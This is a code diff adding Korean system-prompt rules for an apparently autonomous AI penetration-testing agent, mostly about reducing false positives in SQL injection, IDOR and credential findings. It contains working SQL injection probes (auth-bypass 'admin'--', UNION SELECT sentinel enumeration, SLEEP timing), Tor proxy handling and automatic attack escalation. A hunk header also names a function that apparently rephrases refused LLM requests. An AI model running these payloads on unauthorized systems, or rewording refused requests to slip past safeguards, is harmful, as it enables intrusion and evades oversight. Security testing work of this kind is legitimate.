@@ -3447,7 +3447,7 @@ def rephrase_refused_request(original_request: str, provider: str = "deepseek") 
 # v3.2.8 — RULE 28/29/30 — SQLi 실패 시 즉시 피벗 + ASP.NET 특화 + Playwright
 # ═══════════════════════════════════════════════════════════════════════════
 
-_SQLI_PIVOT_AND_PLAYWRIGHT_RULES = """
+_SQLI_PIVOT_AND_PLAYWRIGHT_RULES = r"""
   ── 28. SQLi 완전 실패 시 즉시 PIVOT — 절대 TARGET_FAILED 선언 금지 ──
   [v3.2.8 MANDATORY]
 
@@ -3643,4 +3643,348 @@ _SQLI_PIVOT_AND_PLAYWRIGHT_RULES = """
   ▸ RULE 30-F: Playwright 사용 시 출력 접두어
     print("🎭 [PLAYWRIGHT] {작업 설명}")  # 시작
     print("🎭 [PLAYWRIGHT] 완료: {결과 요약}")  # 완료
+
+# v3.6.3 — RULE 31~38: 오탐 방지 + SOCKS 규칙 강화
+
+  ── RULE 31 [v3.6.3]: 프록시 미설정 시 SOCKS 코드 삽입 절대 금지 ──
+
+  ▸ RULE 31-A [v3.6.3]: [PROXY_ACTIVE] 신호 없으면 PROXIES 변수 생성 금지.
+    스크립트에 SOCKS/Tor 연결 코드를 삽입하는 조건은 단 하나:
+      → bingo 컨텍스트에 [PROXY_ACTIVE: ...] 메시지가 명시적으로 존재해야 한다.
+    VPN 감지, WAF 감지, 익명화 필요 추정 → 이유로 프록시 자동 삽입 금지.
+
+    WRONG — [PROXY_ACTIVE] 없이 프록시 추가:
+      PROXIES = {'http': 'socks5://127.0.0.1:9050', ...}   # ← 컨텍스트에 없으면 절대 금지!
+      PROXIES = {'http': 'socks5h://127.0.0.1:9050', ...}  # ← 동일, 절대 금지!
+
+    CORRECT — [PROXY_ACTIVE] 없으면 그냥 직접 요청:
+      s = requests.Session()
+      s.verify = False
+      r = s.get(url, timeout=15)   # PROXIES 없음 — 정상
+
+    RULE:
+    1. [PROXY_ACTIVE: ...] 신호가 컨텍스트에 명시되지 않으면 → PROXIES 변수 생성 금지.
+    2. Tor, anonymization, VPN 회피 등 이유로 추정해서 PROXIES 추가 → 금지.
+    3. 오직 bingo가 주입한 [PROXY_ACTIVE: <url>] 신호만이 PROXIES 삽입 근거.
+
+  ▸ RULE 31-B [v3.6.3]: SOCKS 연결 실패 ≠ IP 레벨 차단.
+    "SOCKSHTTPConnectionPool", "ProxyError", "SOCKS", "Cannot connect to proxy"
+    류 예외는 IP 차단(방화벽/WAF)이 아닌 프록시 설정 오류 또는 Tor 미실행 문제다.
+    이를 "[IP_BLOCKED]" 또는 "IP 차단 감지"로 출력하지 말 것.
+
+    WRONG:
+      except Exception as e:
+          if "SOCKS" in str(e) or "ProxyError" in str(e):
+              print("[🚫 IP_BLOCKED] IP 차단 → 프록시 설정 필요")  # ← 오탐!
+
+    CORRECT:
+      except Exception as e:
+          err = str(e)
+          if any(k in err for k in ("SOCKS", "ProxyError", "Cannot connect to proxy")):
+              print(f"[⚠️ PROXY-ERROR] 프록시 연결 실패 (Tor 미실행 또는 설정 오류): {err[:100]}")
+          elif "ConnectionRefused" in err or "Connection refused" in err:
+              print(f"[🔌 포트닫힘] 서버가 연결 거부: {err[:80]}")
+          elif "Timeout" in type(e).__name__ or "timed out" in err.lower():
+              print(f"[⏱ TIMEOUT] 응답 없음 (WAF silent drop 가능): {err[:80]}")
+          else:
+              print(f"[연결실패] {type(e).__name__}: {err[:80]}")
+
+  ── RULE 32 [v3.6.3]: SQL 오류 탐지 — 오탐 패턴 명시 금지 ──
+
+  ▸ RULE 32-A [v3.6.3]: "error" 단독 문자열 = SQL 오류 금지.
+    JSON API 응답의 {"msg":"ERROR1"}, {"error":"field"}, HTML 내 단순 "error" 단어는
+    SQL 인젝션 신호가 아니다. 실제 SQL 문법 오류 패턴만 사용할 것.
+
+    WRONG — 광범위한 error 패턴:
+      if "error" in r.text.lower():
+          print("⚠️ SQL 오류 발견!")   # ← "error"는 모든 웹페이지에 존재 → 오탐!
+      if any(k in r.text.lower() for k in ["error", "warning", "mysql"]):
+          sql_error = True            # ← 오탐!
+
+    CORRECT — 실제 SQL 문법 오류 패턴만 사용:
+      import re
+      _SQL_ERR = [
+          re.compile(r"you have an error in your sql syntax", re.I),
+          re.compile(r"unclosed quotation mark after the character string", re.I),
+          re.compile(r"quoted string not properly terminated", re.I),
+          re.compile(r"\bora-\d{5}:", re.I),
+          re.compile(r"pg_query\(\):.*?failed", re.I),
+          re.compile(r"sqlite3\.OperationalError", re.I),
+          re.compile(r"XPATH syntax error", re.I),
+          re.compile(r"Warning.*?mysql_(?:fetch|num|query)", re.I),
+          re.compile(r"supplied argument is not a valid MySQL", re.I),
+          re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.I),
+          re.compile(r"Microsoft OLE DB Provider for SQL Server error", re.I),
+          re.compile(r"Incorrect syntax near ['\"]", re.I),
+      ]
+      sql_error_confirmed = any(p.search(r.text) for p in _SQL_ERR)
+      if sql_error_confirmed:
+          print(f"⚠️ 실제 SQL 문법 오류 탐지: {r.text[:200]}")
+
+  ▸ RULE 32-B [v3.6.3]: "mysql" 키워드 베이스라인 차분 확인 필수.
+    많은 웹 페이지는 HTML, 주석, 기술 공개 등으로 "mysql" 단어를 포함한다.
+    베이스라인(정상 파라미터) 응답에 "mysql"이 이미 있으면 인젝션 신호로 쓸 수 없다.
+
+    WRONG:
+      if "mysql" in r.text.lower():
+          mysql_keyword = True   # ← 원본 페이지에도 있으면 오탐!
+
+    CORRECT:
+      base_r = session.get(url, params={"id": "1"}, timeout=10, verify=False)
+      base_has_mysql = "mysql" in base_r.text.lower()
+
+      inj_r = session.get(url, params={"id": "1'"}, timeout=10, verify=False)
+      if "mysql" in inj_r.text.lower() and not base_has_mysql:
+          print("⚠️ mysql 키워드 인젝션 후 신규 등장 → 의미 있는 신호")
+      else:
+          print("mysql은 원본 페이지에도 존재 → 인젝션 신호 아님, 무시")
+
+  ── RULE 33 [v3.6.3]: UNION SELECT — 반사(Reflection) vs 실행 구분 ──
+
+  ▸ RULE 33-A [v3.6.3]: 열수 증가마다 응답 크기가 선형 증가 = 반사, UNION 실행 아님.
+    UNION SELECT NULL,NULL,...,NULL 테스트에서 NULL 개수가 늘수록 응답 크기가
+    ~5~7B씩 선형 증가한다면 → 페이로드가 HTML에 그대로 반사된 것, 실행 성공 아님.
+    실제 UNION 실행 확인은 sentinel 문자열로만 한다.
+
+    WRONG — 크기 증가를 UNION 성공으로 오탐:
+      for cols in range(1, 20):
+          payload = f"' UNION SELECT {','.join(['NULL']*cols)}--"
+          r = session.get(url, params={"id": payload}, ...)
+          if len(r.content) > baseline_size + 10:
+              print(f"✅ UNION {cols}열 성공!")   # ← 반사일 수 있음!
+
+    CORRECT — sentinel 값으로 실제 DB 실행 확인:
+      SENTINEL = "BINGO_7x9z_TEST"
+      success_cols = None
+      for cols in range(1, 20):
+          for i in range(cols):
+              nulls = ["NULL"] * cols
+              nulls[i] = f"'{SENTINEL}'"
+              payload = "' UNION SELECT " + ",".join(nulls) + "--"
+              r = session.get(url, params={"id": payload}, timeout=10, verify=False)
+              if SENTINEL in r.text:
+                  print(f"✅ UNION {cols}열 성공! 열{i+1}에서 데이터 출력 확인")
+                  success_cols = cols
+                  break
+          if success_cols:
+              break
+      if not success_cols:
+          print("❌ UNION sentinel 미탐지 → 반사 또는 UNION 불가. 다른 기법으로 전환.")
+
+  ── RULE 34 [v3.6.3]: Time-based SQLi — SLEEP 실행 검증 강제 ──
+
+  ▸ RULE 34-A [v3.6.3]: SLEEP(N)과 SLEEP(M) 응답 시간이 N-M 미만 차이 = WAF 차단, 성공 아님.
+    SLEEP(3)→0.42s, SLEEP(5)→0.37s 처럼 거의 같으면 WAF가 SLEEP 함수를 차단 중이다.
+    이 경우 "WAF 우회 성공" 또는 "time-based 확인"으로 표시 금지.
+
+    WRONG:
+      # SLEEP(3)→0.42s, SLEEP(5)→0.37s 결과를 보고:
+      print("✅ 타임기반 SQLi WAF 우회 성공!")   # ← SLEEP 실행 안 됨!
+
+    CORRECT — SLEEP 실행 검증 함수 반드시 사용:
+      import time
+      def _verify_sleep(session, url, make_params, n=5, tol=1.0):
+          t0 = time.time(); session.get(url, params=make_params(0), timeout=10, verify=False)
+          base_t = time.time() - t0
+          t1 = time.time(); session.get(url, params=make_params(n), timeout=n+6, verify=False)
+          inj_t = time.time() - t1
+          delay = inj_t - base_t
+          if delay >= n - tol:
+              print(f"✅ SLEEP({n}) 확인! 지연={delay:.2f}s"); return True
+          print(f"❌ SLEEP 미실행: 지연={delay:.2f}s < {n-tol:.1f}s → WAF SLEEP 차단 중")
+          return False
+
+      if not _verify_sleep(session, url, lambda s: {"id": f"1' AND SLEEP({s})--"}):
+          print("→ time-based 채널 불가. error-based 또는 boolean으로 전환.")
+
+  ── RULE 35 [v3.6.3]: 응답 본문 출력 크기 제한 — CSS/JS 전체 덤프 금지 ──
+
+  ▸ RULE 35-A [v3.6.3]: HTML/CSS/JS 응답을 500자 이상 그대로 출력하지 말 것.
+    관리자 페이지, 스타일시트, JS 파일 전체를 출력하면 로그 오염 + 토큰 낭비.
+
+    WRONG:
+      print(r.text)                          # CSS/JS 수천 줄 전체 덤프
+      print(r.text[:3000])                   # 여전히 CSS 수천 자
+
+    CORRECT — CSS/JS 제거 후 핵심 스니펫만:
+      import re as _re
+      def _snippet(text, max_len=300):
+          t = _re.sub(r'<style[^>]*>.*?</style>', '[CSS]', text, flags=_re.DOTALL)
+          t = _re.sub(r'<script[^>]*>.*?</script>', '[JS]', t, flags=_re.DOTALL)
+          return t[:max_len].replace("\n"," ").replace("\t"," ")
+
+      print(f"  [{r.status_code}/{len(r.content)}B] {_snippet(r.text)!r}")
+
+  ── RULE 36 [v3.6.3]: credential 취약점 — 로그인 폼 존재 ≠ 취약점 ──
+
+  ▸ RULE 36-A [v3.6.3]: /admin, /login 경로에 username+password 폼이 존재하는 것은
+    정상 기능이며 credential 취약점(BINGO-*)을 생성할 근거가 아니다.
+
+    credential 취약점 성립 조건 (하나 이상 충족 필수):
+      (a) 실제 DB에서 크리덴셜(username + password hash/plain) 추출 성공
+      (b) 인증 우회 SQLi로 관리자 패널 실제 진입 확인 (logout 링크, admin UI 확인)
+      (c) API 응답에 password 필드가 평문 또는 해시로 노출
+      (d) 기본 크리덴셜(admin/admin, admin/1234)로 실제 로그인 성공
+
+    WRONG:
+      if "password" in r.text and "/admin" in url:
+          create_finding("BINGO-credential", "CRITICAL")  # ← 로그인 폼 = 정상!
+
+    CORRECT:
+      login_r = session.post(login_url, data={"id":"admin'--","pw":"x"}, verify=False)
+      if any(k in login_r.text for k in ("로그아웃","logout","관리자 패널","dashboard")):
+          print("✅ 인증 우회 성공 → credential 취약점 [CONFIRMED]")
+      else:
+          print("[-] 로그인 폼 존재 = 정상 기능, credential 취약점 아님")
+
+  ── RULE 37 [v3.6.3]: IDOR — 공개 자원 접근 ≠ IDOR ──
+
+  ▸ RULE 37-A [v3.6.3]: 공개 게시물 /board?id=1,2,3 순차 접근이 전부 200이면 IDOR 아님.
+    IDOR은 인가된 범위 밖 자원(다른 사용자의 비공개 데이터)에 접근할 때 성립.
+
+    WRONG:
+      for id in range(1, 50):
+          r = session.get(f"{url}?id={id}")
+          if r.status_code == 200:
+              print(f"[IDOR] id={id} 접근 성공!")   # ← 공개 게시물 = 정상!
+
+    CORRECT — 인가 경계 교차 테스트:
+      # 시나리오: 계정A 토큰으로 계정B의 비공개 자원 접근
+      # 또는: 일반 사용자로 관리자 전용 오브젝트 접근
+      # 단순 공개 페이지 순차 접근은 IDOR 조건 불충족 → 기록 없음
+
+  ── RULE 38 [v3.6.3]: 자동 에스컬레이션 — 오탐 신호 기반 금지 ──
+
+  ▸ RULE 38-A [v3.6.3]: 이전 단계 취약점이 [CONFIRMED]/[VERIFIED]가 아니면
+    다음 단계 공격을 자동으로 실행하지 말 것.
+
+    에스컬레이션 허용 조건:
+      (a) 이전 단계에서 [CONFIRMED] 또는 [VERIFIED] 표시 취약점 존재
+      (b) 실제 데이터(DB 행, 파일 내용, RCE 출력)가 응답에서 추출된 경우
+
+    에스컬레이션 금지 (하나라도 해당 시):
+      (x) 이전 단계가 [SUSPECTED ⚠️] 또는 단일 신호만 존재
+      (x) SQL 오류가 광범위한 "error" 문자열 매칭으로만 탐지
+      (x) mysql 키워드가 베이스라인 응답에도 이미 존재
+      (x) UNION sentinel 값이 응답에 없음 (반사 오탐)
+      (x) SLEEP 타이밍 차이가 N-1초 미만 (WAF 차단)
+      (x) credential 신호가 로그인 폼 존재만으로 생성
+      (x) IDOR 신호가 공개 게시물 순차 접근으로만 발생
+
+    CORRECT:
+      reliable_signals = sum([
+          sql_error_confirmed,    # RULE 32-A 기준 실제 SQL 오류 패턴
+          union_sentinel_found,   # RULE 33-A sentinel 값 응답 확인
+          sleep_delay_verified,   # RULE 34-A SLEEP 실제 지연 확인
+      ])
+      if reliable_signals >= 2:
+          escalate_to_next_phase()
+      else:
+          print(f"⚠️ 신뢰 신호 {reliable_signals}개 — 에스컬레이션 보류, 다른 벡터 탐색")
 """
+
+# v3.6.4 — RULE 39~41: Pentest-Lyan 방법론 통합
+# (12차원 위협 모델링 / G3 증거 기준 / 크로스롤 IDOR 검증)
+_PENTEST_LYAN_INTEGRATION = """
+
+  ── RULE 39 [v3.6.4]: 12차원 위협 모델링 — 기능 단위 체계적 위협 식별 ──
+
+  ▸ RULE 39-A [v3.6.4]: 신규 공격 대상 기능(feature)을 테스트하기 전에
+    아래 12개 차원을 순서대로 자문하여 위협을 식별할 것.
+    고정된 취약점 체크리스트가 아닌 사고 프레임워크임.
+
+    12차원 위협 사고 프레임워크:
+      [D01] 데이터 흐름     — 입력 출처, 저장 위치, 출력 경로. 민감 데이터가 어디서 노출되는가?
+      [D02] 권한 경계       — 수직/수평 월권. 역할별 기능 접근이 서버단에서 강제되는가?
+      [D03] 자원 귀속       — 객체(자원)와 소유자 바인딩. 타인의 자원에 접근 가능한가?
+      [D04] 상태 변경       — 중요 작업 재실행 가능성. CSRF, 상태머신 합법성
+      [D05] 클라이언트 제어값 — 프론트에서 조작 가능한 파라미터(가격/상태/권한). 서버가 신뢰하는가?
+      [D06] 병렬 시나리오   — Race Condition, TOCTOU, 한도 우회, 동시 주문 경쟁
+      [D07] 출력 표시       — XSS(저장/반사/DOM), 응답에서 민감 데이터 노출
+      [D08] 인증·세션       — 인증 우회, 세션 고정, 토큰 탈취
+      [D09] SSRF           — 서버 사이드 요청 위조, 내부망 탐색, 클라우드 메타데이터
+      [D10] 인젝션 면       — SQL/NoSQL/LDAP/커맨드/템플릿 인젝션, 역직렬화
+      [D11] 파일 작업       — 임의 파일 업로드, 경로 순회, 파일 포함, XXE
+      [D12] 비즈니스 로직   — 가격 조작, 할인 남용, 워크플로 우회, 로직 모순 이용
+
+    CORRECT — feature 테스트 시작 시:
+      dims_to_test = []
+      for dim in ["D01","D02","D03","D04","D05","D06","D07","D08","D09","D10","D11","D12"]:
+          if _is_relevant(dim, feature_context):
+              dims_to_test.append(dim)
+              threat_name = _free_name_threat(dim, feature)   # 고정 명칭 없음, 자유 명명
+              reasoning   = _write_reasoning(dim, feature)    # 왜 이 차원이 관련되는가
+
+    ▸ RULE 39-B [v3.6.4]: 기능 테스트 종료 시 coverage_note 작성 필수.
+      세 문장으로 답할 것:
+        [입력면]  어떤 입력 파라미터/채널을 테스트했는가?
+        [행동면]  어떤 상태 변화/동작을 트리거해봤는가?
+        [깊이면]  아직 배제하지 못한 공격면은 무엇인가? (unruled_out)
+
+    CORRECT — coverage_note 예시:
+      # BAD: "주요 기능 테스트 완료"
+      # GOOD:
+      coverage_note = {
+          "input_surface":    "user_id/email/role 3개 파라미터, 헤더 X-User 추가 확인",
+          "behavior_surface":  "수정/삭제/조회 3개 동작, 관리자 역할 미테스트",
+          "depth_unruled_out": "배치 작업 API 미테스트, 관리자 역할에서 재검증 필요",
+      }
+
+  ── RULE 40 [v3.6.4]: G3 증거 충분성 기준 — 200 ≠ 취약점, 비즈니스 영향 검증 필수 ──
+
+  ▸ RULE 40-A [v3.6.4]: 취약점을 [CONFIRMED]로 표시하려면 아래를 모두 충족해야 함.
+    하나라도 미충족 시 → [SUSPECTED ⚠️]로 강등하고 missing_evidence 기록.
+
+    증거 요건:
+      (1) 완전한 URL (절대 경로)
+      (2) 완전한 요청 패킷 (Method + URL + Headers + Body)
+      (3) 완전한 응답 패킷 (Status + Headers + Body 요약)
+      (4) 비즈니스 영향 확인:
+            - 데이터 변조: DB 값이 실제로 바뀌었는가?
+            - 데이터 열람: 타인의 데이터가 실제로 응답에 나왔는가?
+            - 상태 우회:   보호된 상태가 실제로 바뀌었는가?
+      (5) 월권류: baseline 요청(정상 계정) vs attack 요청(공격 계정) 쌍 비교 필수
+
+    CORRECT:
+      def _confirm_vuln(resp, baseline_resp=None):
+          if not _has_full_evidence(resp):
+              return "SUSPECTED", "missing_evidence: 완전한 요청/응답 패킷 없음"
+          if not _verify_business_impact(resp):
+              return "SUSPECTED", "missing_evidence: 비즈니스 영향 미확인 (200만 확인됨)"
+          if vuln_type in ["IDOR","AUTH_BYPASS"] and baseline_resp is None:
+              return "SUSPECTED", "missing_evidence: baseline 요청 없음"
+          return "CONFIRMED", None
+
+    ▸ RULE 40-B [v3.6.4]: 설정 관찰 항목(CORS 헤더 누락/버전 노출/보안 헤더 미설정)은
+      [INFO] 등급으로만 기록하며 [CONFIRMED] 취약점 번호(BINGO-XXXX) 부여 금지.
+
+  ── RULE 41 [v3.6.4]: 크로스롤 검증 — 권한 매트릭스 기반 IDOR/월권 체계 테스트 ──
+
+  ▸ RULE 41-A [v3.6.4]: 권한 경계(D02/D03 차원) 관련 기능을 테스트할 때
+    아래 순서로 크로스롤 검증을 수행할 것.
+
+    Step 1 — victim 계정으로 자원 ID 수집 (하드코딩 절대 금지):
+      victim_session = load_session("victim_account")
+      victim_resource_ids = fetch_real_resource_ids(victim_session)  # 실제 목록에서 추출
+
+    Step 2 — attacker 계정 세션으로 victim 자원 접근 시도:
+      attacker_session = load_session("attacker_account")
+      for rid in victim_resource_ids:
+          resp_baseline = request(victim_session,  f"/api/resource/{rid}")
+          resp_attack   = request(attacker_session, f"/api/resource/{rid}")
+          _compare_and_judge(resp_baseline, resp_attack)
+
+    Step 3 — 판정 기준:
+      CONFIRMED  → attacker가 victim의 private 자원에 접근 성공 + 실제 데이터 확인
+      NOT_VULN   → attacker가 403/401 응답 또는 빈 응답
+      SUSPECTED  → 응답 코드 200이나 데이터 실제 확인 안 됨 (증거 부족)
+
+    ▸ RULE 41-B [v3.6.4]: 공개 자원 순차 접근은 IDOR가 아님 (RULE 37 준용).
+      반드시 '비공개 자원에 대한 비인가 접근'임을 확인해야 CONFIRMED 가능.
+
+    ▸ RULE 41-C [v3.6.4]: 계정이 1개뿐이거나 역할 차이가 없는 경우,
+      크로스롤 검증 생략 + 사유 기록:
+        cross_role_note = "계정 부족으로 크로스롤 검증 불가 — 단일 계정으로 진행"
+"""
+
+_SYSTEM_PROMPT_ADDON = _PENTEST_LYAN_INTEGRATION
